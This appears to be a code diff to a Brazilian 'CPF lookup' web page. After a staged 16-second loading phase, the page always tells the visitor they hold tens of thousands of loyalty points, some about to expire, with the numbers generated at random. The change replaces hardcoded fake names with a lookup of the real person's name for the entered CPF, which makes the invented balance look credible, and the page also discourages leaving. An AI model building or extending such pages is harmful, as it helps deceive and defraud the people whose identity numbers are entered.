@@ -18,22 +18,21 @@ function validateCpf(cpf: string): boolean {
 
 const LOADING_DURATION = 16000;
 
-const names = [
-  "Maria Silva Santos",
-  "Joao Pedro Oliveira",
-  "Ana Carolina Ferreira",
-  "Carlos Eduardo Lima",
-  "Fernanda Costa Souza",
-  "Rafael Almeida Nunes",
-  "Juliana Rocha Mendes",
-  "Lucas Barbosa Pereira",
-];
-
-function generateResult(cpf: string) {
+function generatePoints() {
   const points = Math.floor(Math.random() * (150000 - 60000 + 1)) + 60000;
   const expiring = Math.floor(points * (Math.random() * 0.15 + 0.05));
-  const name = names[Math.floor(Math.random() * names.length)];
-  return { hasPoints: true, name, cpf, points, expiring };
+  return { points, expiring };
+}
+
+async function fetchCpfData(cpf: string): Promise<{ nome?: string; cpf?: string; status?: string }> {
+  try {
+    const cleanCpf = cpf.replace(/\D/g, "");
+    const res = await fetch(`/api/consulta-cpf?cpf=${cleanCpf}`);
+    if (!res.ok) throw new Error("Erro na consulta");
+    return await res.json();
+  } catch {
+    return {};
+  }
 }
 
 type Phase = "form" | "loading" | "result";
@@ -56,9 +55,15 @@ export default function CpfConsulta() {
   const [progress, setProgress] = useState(0);
   const [result, setResult] = useState<{ hasPoints: boolean; name: string; cpf: string; points: number; expiring: number } | null>(null);
   const [loadingText, setLoadingText] = useState(loadingMessages[0]);
-
   useEffect(() => {
     if (phase !== "loading") return;
+
+    let cancelled = false;
+    let resolvedName = "Usuario identificado";
+
+    const apiPromise = fetchCpfData(cpf).then((data) => {
+      if (data?.nome) resolvedName = data.nome;
+    });
 
     const startTime = Date.now();
     const interval = setInterval(() => {
@@ -73,11 +78,14 @@ export default function CpfConsulta() {
       if (elapsed >= LOADING_DURATION) clearInterval(interval);
     }, 100);
 
-    const timer = setTimeout(() => {
+    const timer = setTimeout(async () => {
       clearInterval(interval);
-      const generatedResult = generateResult(formatCpf(cpf));
-      localStorage.setItem("pontosUsuario", String(generatedResult.points));
-      setResult(generatedResult);
+      await apiPromise;
+      if (cancelled) return;
+      const { points, expiring } = generatePoints();
+      const formattedCpf = formatCpf(cpf);
+      localStorage.setItem("pontosUsuario", String(points));
+      setResult({ hasPoints: true, name: resolvedName, cpf: formattedCpf, points, expiring });
       setProgress(100);
       setPhase("result");
     }, LOADING_DURATION);
@@ -89,6 +97,7 @@ export default function CpfConsulta() {
     window.addEventListener("beforeunload", handleBeforeUnload);
 
     return () => {
+      cancelled = true;
       clearInterval(interval);
       clearTimeout(timer);
       window.removeEventListener("beforeunload", handleBeforeUnload);
